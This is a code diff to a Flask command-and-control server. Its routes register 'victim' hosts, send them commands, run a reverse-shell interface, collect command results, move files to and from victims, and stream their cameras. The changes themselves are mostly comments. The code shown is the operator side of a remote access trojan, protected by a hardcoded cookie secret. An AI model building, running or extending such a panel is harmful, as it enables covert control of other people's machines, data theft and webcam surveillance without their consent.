@@ -21,7 +21,7 @@ socketio = SocketIO(app)
 '''
 hosts = {}
 
-
+# function to add a comannd for the a host
 def send_command(name, ip, command):
   global hosts
   key = (ip, name)
@@ -33,10 +33,10 @@ def send_command(name, ip, command):
   
   return 1
 
-# interface routes
+# index page to see all hosts
 @app.route('/')
 def displayHosts():
-  if request.cookies.get('superSecretKey') != 'c457r4v371':
+  if request.cookies.get('superSecretKey') != 'c457r4v371': #check if logged it
     return render_template('notLoggedIn.html')
   global hosts
   for host in hosts:
@@ -62,6 +62,7 @@ def displayHosts():
 def handshake():
   global hosts
   key = (request.remote_addr, request.form['name'])
+  # initiate default data structure for host
   hosts[key] = {'lock' : threading.Lock(), 'command' : '', 'status' : 'Down', 'log' : [''], 
                 'command_result' : {'command' : '', 
                                     'upload' : '',
@@ -69,15 +70,13 @@ def handshake():
   hosts[key]['lock'].acquire()
   return 'Request accepted', 200
 
+# this is where hosts can send their ping responses 
 @app.route('/pong', methods = ['POST'])
 def pong():
   global hosts
-
-  # this is where hosts can send their ping responses 
   # after a response the host status will be set
   key = (request.remote_addr, request.form['name'])
   hosts[key]['status'] = 'Up'
-
   return 'Pong sent.', 200
 
 # the client is waiting here for the commands
@@ -95,13 +94,11 @@ def timeout():
 # this is for the general interface where you can pick different tools to control one victim
 @app.route('/toolkit', methods = ['GET'])
 def show_toolkit():
-  if request.cookies.get('superSecretKey') != 'c457r4v371':
+  if request.cookies.get('superSecretKey') != 'c457r4v371': #check if logged it
     return render_template('notLoggedIn.html')
   global hosts
-
   name = request.args.get('name')
   ip = request.args.get('ip')
-
   return render_template('toolkit.html', name = name, ip = ip)
 
 # this route is for sending data (especially commands) to the host
@@ -115,20 +112,18 @@ def send_process():
     return "0", 200
   return "1", 200
 
-# the route for reverse shell contorl
+# route for managing reverse shell
 @app.route('/shell', methods = ['GET', 'POST'])
 def shell():
   global hosts 
-  
-  if request.method == 'GET':
-    if request.cookies.get('superSecretKey') != 'c457r4v371':
+  if request.method == 'GET': # the route for reverse shell interface
+    if request.cookies.get('superSecretKey') != 'c457r4v371': #check if logged it
       return render_template('notLoggedIn.html')
     name = request.args.get('name')
     ip = request.args.get('ip')
-
     return render_template('command.html', name = name, ip = ip)
   
-  elif request.method == 'POST':
+  elif request.method == 'POST': # route to return result of a shell command
     name = request.form['name']
     ip = request.form['ip']
     command = request.form['command'] 
@@ -137,7 +132,7 @@ def shell():
     return render_template('command.html', name = name, ip = ip, last_command=command)
     
 
-# this is where the victim will send the command result
+# this is where the victim will send the command result for different types of commands
 @app.route('/result', methods = ['POST'])
 def result():
   global hosts
@@ -183,7 +178,7 @@ def getLog():
   global hosts
 
   if request.method == 'GET':
-    if request.cookies.get('superSecretKey') != 'c457r4v371':
+    if request.cookies.get('superSecretKey') != 'c457r4v371': #check if logged it
       return render_template('notLoggedIn.html')
     name = request.args.get('name')
     ip = request.args.get('ip')
@@ -201,13 +196,13 @@ def getLog():
 # the download route for the download command
 @app.route('/download', methods = ['POST', 'GET'])
 def download():
-  if request.method == 'GET':
-    if request.cookies.get('superSecretKey') != 'c457r4v371':
+  if request.method == 'GET': # route for the download web interface
+    if request.cookies.get('superSecretKey') != 'c457r4v371': #check if logged it
       return render_template('notLoggedIn.html')
     name = request.args.get('name')
     ip = request.args.get('ip')
     return render_template('download.html', name = name, ip = ip)
-  elif request.method == 'POST':
+  elif request.method == 'POST': # the route where a host can download a file from
     file = request.form['file']
     path = './resources/' + file
     if os.path.exists(path):
@@ -218,8 +213,8 @@ def download():
 # route to the file uploading interface
 @app.route('/upload', methods = ['GET', 'POST'])
 def upload():
-  if request.method == 'GET':
-    if request.cookies.get('superSecretKey') != 'c457r4v371':
+  if request.method == 'GET': # the route to the file uploading interface
+    if request.cookies.get('superSecretKey') != 'c457r4v371': #check if logged it
       return render_template('notLoggedIn.html')
     global hosts
     name = request.args.get('name')
@@ -229,7 +224,7 @@ def upload():
     file_list = os.listdir("./resources")
 
     return render_template('upload.html', name = name, ip = ip, files = file_list)
-  elif request.method == 'POST':
+  elif request.method == 'POST': # the route where a client can send a file to the server
     if 'file' not in request.files:
         return 'No file part'
     file = request.files['file']
@@ -239,6 +234,7 @@ def upload():
         file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename))
         return 'File successfully uploaded'
 
+# the route to upload a file to the server's resources
 @app.route('/upload_file', methods = ['POST'])
 def upload_file():
   return_url = request.form['currentUrl']
@@ -266,9 +262,10 @@ def handle_stream(data):
     # Broadcast received JPEG data to all clients
     socketio.emit('stream', data)
 
+# the route to see the camera
 @app.route('/viewCamera', methods=['GET'])
 def view_camera():
-  if request.cookies.get('superSecretKey') != 'c457r4v371':
+  if request.cookies.get('superSecretKey') != 'c457r4v371': #check if logged it
     return render_template('notLoggedIn.html')
   return render_template('camera.html', name=request.args.get('name'), ip=request.args.get('ip')) 
 
